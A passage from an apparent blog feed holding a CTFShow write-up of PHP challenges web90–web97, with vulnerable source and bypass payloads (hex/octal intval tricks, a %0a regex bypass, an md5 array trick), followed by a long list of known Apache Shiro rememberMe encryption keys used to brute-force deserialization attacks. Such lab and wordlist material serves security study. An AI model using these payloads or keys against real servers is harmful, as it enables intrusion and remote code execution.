class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">== ===缺陷绕过 == 弱类型对比 ===还会比较类型</span><br></pre></td></tr></table></figure><p><strong>intval()</strong> 函数用于获取变量的整数值。</p><p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p>强类型比较   把4476转换成十六进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117c</span><br></pre></td></tr></table></figure><h3 id><a href="#" class="headerlink" title></a><img src="/.git//Users\19504\AppData\Roaming\Typora\typora-user-images\image-20220410180533122.png" alt="image-20220410180533122"><img src="/.git//img.png" alt="img.png"></h3><h3 id="web91："><a href="#web91：" class="headerlink" title="web91："></a>web91：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>preg_match先看这个函数：preg_match 函数用于执行一个正则表达式匹配。</p><p>看第一个if匹配php，第二个if匹配到php输出hacker，要输出第三个else则需要绕过第二个if，用正则表达式来绕过</p><blockquote><p><strong>&#x2F;i表示匹配大小写</strong><br><strong>字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾</strong><br><strong>&#x2F;m 多行匹配 若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配</strong><br><strong>但是当出现换行符 <code>%0a</code>的时候，$cmd的值会被当做两行处理，而此时第二个if正则匹配不符合以php开头和以php结尾</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=%0aphp</span><br></pre></td></tr></table></figure><h3 id="web92："><a href="#web92：" class="headerlink" title="web92："></a>web92：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型比较，十六进制可绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=4476.1</span><br><span class="line">?num=0x117c</span><br></pre></td></tr></table></figure><h3 id="web93"><a href="#web93" class="headerlink" title="web93:"></a>web93:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">  $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">  if($num==4476)&#123;</span><br><span class="line">    die(&quot;no no no!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">    die(&quot;no no no!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if(intval($num,0)==4476)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    echo intval($num,0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到过滤了[a-z]，和上题一样，用浮点数绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?nmu=4476.1</span><br></pre></td></tr></table></figure><h3 id="web94："><a href="#web94：" class="headerlink" title="web94："></a>web94：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。</p><p>&#x3D;&#x3D;&#x3D;   强类型比较，绕过去之后preg_match[a-z]&#x2F;i，第三个if出现了一个函数strpos</p><p><img src="/.git//Users\19504\AppData\Roaming\Typora\typora-user-images\image-20220410181801815.png" alt="image-20220410181801815"></p><p><strong>因为八进制需要开头指定为0，而strpos()会匹配到返回0，!0也就是1得执行die，我们可以在前面加个空格，这样strpos()会返回1，所以我们把4476转换为8进制10574后，前面再加一个空格即可，payload为</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=%20010574</span><br><span class="line">还一种思路：?num=4476.0</span><br></pre></td></tr></table></figure><h3 id="web95："><a href="#web95：" class="headerlink" title="web95："></a>web95：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型比较，思路一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%20010574</span><br></pre></td></tr></table></figure><h3 id="web96："><a href="#web96：" class="headerlink" title="web96："></a>web96：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;u&#x27;]))&#123;</span><br><span class="line">    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class="line">        die(&quot;no no no&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型，读取flag.php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=./flag.php</span><br></pre></td></tr></table></figure><h3 id="web97："><a href="#web97：" class="headerlink" title="web97："></a>web97：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class="line">if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class="line">echo $flag;</span><br><span class="line">else</span><br><span class="line">print &#x27;Wrong.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>POST发包输出个a再输出个b且强类型比较md5加密了，两个NULL值相等即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST：</span><br><span class="line">a[]=1&amp;bp[]=2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFShow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro Key 1223</title>
      <link href="/2022/06/18/Shiro%20Key%201223/"/>
      <url>/2022/06/18/Shiro%20Key%201223/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Shiro Key 1223</p><p>kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;<br>2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;<br>3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;<br>6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D;<br>bWljcm9zAAAAAAAAAAAAAA&#x3D;&#x3D;<br>wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;<br>Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;<br>MTIzNDU2Nzg5MGFiY2RlZg&#x3D;&#x3D;<br>U3ByaW5nQmxhZGUAAAAAAA&#x3D;&#x3D;<br>5AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;<br>1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D;<br>ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;<br>L7RioUULEFhRyxM7a2R&#x2F;Yg&#x3D;&#x3D;<br>r0e3c16IdVkouZgk1TKVMg&#x3D;&#x3D;<br>bWluZS1hc3NldC1rZXk6QQ&#x3D;&#x3D;<br>a2VlcE9uR29pbmdBbmRGaQ&#x3D;&#x3D;<br>WcfHGU25gNnTxTlmJMeSpw&#x3D;&#x3D;<br>ZAvph3dsQs0FSL3SDFAdag&#x3D;&#x3D;<br>tiVV6g3uZBGfgshesAQbjA&#x3D;&#x3D;<br>cmVtZW1iZXJNZQAAAAAAAA&#x3D;&#x3D;<br>ZnJlc2h6Y24xMjM0NTY3OA&#x3D;&#x3D;<br>RVZBTk5JR0hUTFlfV0FPVQ&#x3D;&#x3D;<br>WkhBTkdYSUFPSEVJX0NBVA&#x3D;&#x3D;<br>zSyK5Kp6PZAAjlT+eeNMlg&#x3D;&#x3D;<br>bXdrXl9eNjY2KjA3Z2otPQ&#x3D;&#x3D;<br>GsHaWo4m1eNbE0kNSMULhg&#x3D;&#x3D;<br>l8cc6d2xpkT1yFtLIcLHCg&#x3D;&#x3D;<br>KU471rVNQ6k7PQL4SqxgJg&#x3D;&#x3D;<br>0AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>1AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;<br>25BsmdYwjnfcWmnhAciDDg&#x3D;&#x3D;<br>3JvYhmBLUs0ETA5Kprsdag&#x3D;&#x3D;<br>6AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>6NfXkC7YVCV5DASIrEm1Rg&#x3D;&#x3D;<br>7AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>8AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>8BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>9AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>OUHYQzxQ&#x2F;W9e&#x2F;UjiAGu6rg&#x3D;&#x3D;<br>a3dvbmcAAAAAAAAAAAAAAA&#x3D;&#x3D;<br>aU1pcmFjbGVpTWlyYWNsZQ&#x3D;&#x3D;<br>bXRvbnMAAAAAAAAAAAAAAA&#x3D;&#x3D;<br>OY&#x2F;&#x2F;C4rhfwNxCQAQCrQQ1Q&#x3D;&#x3D;<br>5J7bIJIV0LQSN3c9LPitBQ&#x3D;&#x3D;<br>f&#x2F;SY5TIve5WWzT4aQlABJA&#x3D;&#x3D;<br>bya2HkYo57u6fWh5theAWw&#x3D;&#x3D;<br>WuB+y2gcHRnY2Lg9+Aqmqg&#x3D;&#x3D;<br>3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D;<br>YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D;<br>6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D;<br>2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D;<br>6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;<br>SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D;<br>2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D;<br>fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;<br>XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;<br>sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;<br>O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D;<br>HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D;<br>rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D;<br>Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D;<br>lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D;<br>MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D;<br>xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D;<br>c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D;<br>ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D;<br>Bf7MfkNR0axGGptozrebag&#x3D;&#x3D;<br>1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D;<br>ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;<br>cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D;<br>IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D;<br>yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D;<br>cGljYXMAAAAAAAAAAAAAAA&#x3D;&#x3D;<br>2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;<br>XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D;<br>ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;<br>s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D;<br>hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D;<br>9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D;<br>d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;<br>yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D;<br>NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D;<br>4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D;<br>empodDEyMwAAAAAAAAAAAA&#x3D;&#x3D;<br>A7UzJgh1+EWj5oBFi+mSgw&#x3D;&#x3D;<br>c2hpcm9fYmF0aXMzMgAAAA&#x3D;&#x3D;<br>i45FVt72K2kLgvFrJtoZRw&#x3D;&#x3D;<br>U3BAbW5nQmxhZGUAAAAAAA&#x3D;&#x3D;<br>Jt3C93kMR9D5e8QzwfsiMw&#x3D;&#x3D;<br>MTIzNDU2NzgxMjM0NTY3OA&#x3D;&#x3D;<br>vXP33AonIp9bFwGl7aT7rA&#x3D;&#x3D;<br>V2hhdCBUaGUgSGVsbAAAAA&#x3D;&#x3D;<br>Q01TX0JGTFlLRVlfMjAxOQ&#x3D;&#x3D;<br>Is9zJ3pzNh2cgTHB4ua3+Q&#x3D;&#x3D;<br>NsZXjXVklWPZwOfkvk6kUA&#x3D;&#x3D;<br>GAevYnznvgNCURavBhCr1w&#x3D;&#x3D;<br>66v1O8keKNV3TTcGPK1wzg&#x3D;&#x3D;<br>SDKOLKn2J1j&#x2F;2BHjeZwAoQ&#x3D;&#x3D;<br>kPH+bIxk5D2deZiIxcabaA&#x3D;&#x3D;<br>kPH+bIxk5D2deZiIxcacaA&#x3D;&#x3D;<br>3AvVhdAgUs0FSA4SDFAdBg&#x3D;&#x3D;<br>4AvVhdsgUs0F563SDFAdag&#x3D;&#x3D;<br>FL9HL9Yu5bVUJ0PDU1ySvg&#x3D;&#x3D;<br>5RC7uBZLkByfFfJm22q&#x2F;Zw&#x3D;&#x3D;<br>eXNmAAAAAAAAAAAAAAAAAA&#x3D;&#x3D;<br>fdCEiK9YvLC668sS43CJ6A&#x3D;&#x3D;<br>FJoQCiz0z5XWz2N2LyxNww&#x3D;&#x3D;<br>HeUZ&#x2F;LvgkO7nsa18ZyVxWQ&#x3D;&#x3D;<br>HoTP07fJPKIRLOWoVXmv+Q&#x3D;&#x3D;<br>iycgIIyCatQofd0XXxbzEg&#x3D;&#x3D;<br>m0&#x2F;5ZZ9L4jjQXn7MREr&#x2F;bw&#x3D;&#x3D;<br>NoIw91X9GSiCrLCF03ZGZw&#x3D;&#x3D;<br>oPH+bIxk5E2enZiIxcqaaA&#x3D;&#x3D;<br>QAk0rp8sG0uJC4Ke2baYNA&#x3D;&#x3D;<br>Rb5RN+LofDWJlzWAwsXzxg&#x3D;&#x3D;<br>s2SE9y32PvLeYo+VGFpcKA&#x3D;&#x3D;<br>SrpFBcVD89eTQ2icOD0TMg&#x3D;&#x3D;<br>U0hGX2d1bnMAAAAAAAAAAA&#x3D;&#x3D;<br>Us0KvVhTeasAm43KFLAeng&#x3D;&#x3D;<br>Ymx1ZXdoYWxlAAAAAAAAAA&#x3D;&#x3D;<br>YWJjZGRjYmFhYmNkZGNiYQ&#x3D;&#x3D;<br>zIiHplamyXlVB11UXWol8g&#x3D;&#x3D;<br>ZjQyMTJiNTJhZGZmYjFjMQ&#x3D;&#x3D;<br>YystomRZLMUjiK0Q1+LFdw&#x3D;&#x3D;<br>QDFCnfkLUs0KTA3Kprsdag&#x3D;&#x3D;<br>2adsfasdqerqerqewradsf&#x3D;&#x3D;<br>5oiR5piv5p2h5ZK46bG8IQ&#x3D;&#x3D;<br>3AvVhmFLUs0KTA3KaTHGFg&#x3D;&#x3D;<br>2AvVCXsxUs0FSA7SYFjdQg&#x3D;&#x3D;<br>TGMPe7lGO&#x2F;Gbr38QiJu1&#x2F;w&#x3D;&#x3D;<br>GhrF5zLfq1Dtadd1jlohhA&#x3D;&#x3D;<br>sBv2t3okbdm3U0r2EVcSzB&#x3D;&#x3D;<br>AztiX2RUqhc7dhOzl1Mj8Q&#x3D;&#x3D;<br>QVN1bm5uJ3MgU3Vuc2l0ZQ&#x3D;&#x3D;<br>3Av2hmFLAs0BTA3Kprsd6E&#x3D;&#x3D;<br>YVd4dmRtVjViM1UlM0QIdn&#x3D;&#x3D;<br>5AvVhCsgUs0FSA3SDFAdag&#x3D;&#x3D;<br>QUxQSEFNWVNPRlRCVUlMRA&#x3D;&#x3D;<br>9Ami6v2G5Y+r5aPnE4OlBB&#x3D;&#x3D;<br>sgIQrqUVxa1OZRRIK3hLZw&#x3D;&#x3D;<br>mIccZhQt6EBHrZIyw1FAXQ&#x3D;&#x3D;<br>wrjUh2ttBPQLnT4JVhriug&#x3D;&#x3D;<br>3rvVhmFLUs0KAT3Kprsdag&#x3D;&#x3D;<br>4WCZSJyqdUQsije93aQIRg&#x3D;&#x3D;<br>4rvVhmFLUs0KAT3Kprsdag&#x3D;&#x3D;<br>FP7qKJzdJOGkzoQzo2wTmA&#x3D;&#x3D;<br>UGlzMjAxNiVLeUVlXiEjLw&#x3D;&#x3D;<br>c2hvdWtlLXBsdXMuMjAxNg&#x3D;&#x3D;<br>QF5HMyZAWDZYRyFnSGhTdQ&#x3D;&#x3D;<br>2AvVhdsgUsOFSA3SDFAdag&#x3D;&#x3D;<br>fCq+&#x2F;xW488hMTCE+cmJ3FF&#x3D;&#x3D;<br>HOlg7NHb9potm0n5s4ic0Q&#x3D;&#x3D;<br>YWdlbnRAZG1AMjAxOHN3Zg&#x3D;&#x3D;<br>3AvVhMFLIs0KTA3Kprsdag&#x3D;&#x3D;<br>M2djA70UBBUPDibGZBRvrA&#x3D;&#x3D;<br>AF05JAuyuEB1ouJQ9Y9Phg&#x3D;&#x3D;<br>4AvVhmFLUs0KTA3KAAAAAA&#x3D;&#x3D;<br>4AvVhmFLUs0KTA3Kprseaf&#x3D;&#x3D;<br>w793pPq5ZVBKkj8OhV4KaQ&#x3D;&#x3D;<br>Z3VucwAAAAAAAAAAAAABBB&#x3D;&#x3D;<br>pyyX1c5x2f0LZZ7VKZXjKO&#x3D;&#x3D;<br>8AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;<br>B9rPF8FHhxKJZ9k63ik7kQ&#x3D;&#x3D;<br>2AvVidsaUSofSA3SDFAdog&#x3D;&#x3D;<br>3qDVdLawoIr1xFd6ietnsg&#x3D;&#x3D;<br>R29yZG9uV2ViAAAAAAAAAA&#x3D;&#x3D;<br>3AvVhmFLUs0KTA3Kprsdag &#x3D;&#x3D;<br>2AvVhdsgUs0FSA3SDFAder&#x3D;&#x3D;<br>GHxH6G3LFh8Zb3NwoRgfFA&#x3D;&#x3D;<br>A+kWR7o9O0&#x2F;G&#x2F;W6aOGesRA&#x3D;&#x3D;<br>4AvVhmFLUs5KTA1Kprsdag&#x3D;&#x3D;<br>2AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>b2EAAAAAAAAAAAAAAAAAAA&#x3D;&#x3D;<br>wyLZMDifwq3sW1vhhHpgKA&#x3D;&#x3D;<br>YnlhdnMAAAAAAAAAAAAAAA&#x3D;&#x3D;<br>3AvVhdAgUs1FSA4SDFAdBg&#x3D;&#x3D;<br>ZGdmdwAAAAAAAAAAAAAAAA<br>Cj6LnKZNLEowAZrdqyH&#x2F;Ew&#x3D;&#x3D;<br>Z3VucwACAOVAKALACAADSA&#x3D;&#x3D;<br>duhfin37x6chw29jsne45m&#x3D;&#x3D;<br>FjbNm1avvGmWE9CY2HqV75&#x3D;&#x3D;<br>2AvVhdsgERdsSA3SDFAdag&#x3D;&#x3D;<br>4AvVhmFLUs0TTA3Kprsdag&#x3D;&#x3D;<br>2AvVhdsgUs0FSA3SaFAdfg&#x3D;&#x3D;<br>4AvVhm2LUs0KTA3Kprsdag&#x3D;&#x3D;<br>pbnA+Qzen1vjV3rNqQBLHg&#x3D;&#x3D;<br>kPv59vyqzj00x11LXJZTjJ2UHW48jzHN<br>a69ec781563b1a5d791f7b2bdd117a36<br>4AvVhmFLUs0KTA3Kprsdcg&#x3D;&#x3D;<br>4AvVhmFLUsOKTA3Kprsdag&#x3D;&#x3D;<br>kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;<br>4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>WkhBTkdYSUFPSEVJX0NBVA&#x3D;&#x3D;<br>U3ByaW5nQmxhZGUAAAAAAA&#x3D;&#x3D;<br>cGljYXMAAAAAAAAAAAAAAA&#x3D;&#x3D;<br>d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;<br>fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;<br>sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;<br>WuB+y2gcHRnY2Lg9+Aqmqg&#x3D;&#x3D;<br>ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;<br>6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;<br>f&#x2F;SY5TIve5WWzT4aQlABJA&#x3D;&#x3D;<br>Jt3C93kMR9D5e8QzwfsiMw&#x3D;&#x3D;<br>aU1pcmFjbGVpTWlyYWNsZQ&#x3D;&#x3D;<br>XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;<br>8AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>66v1O8keKNV3TTcGPK1wzg&#x3D;&#x3D;<br>Q01TX0JGTFlLRVlfMjAxOQ&#x3D;&#x3D;<br>5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;<br>ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;<br>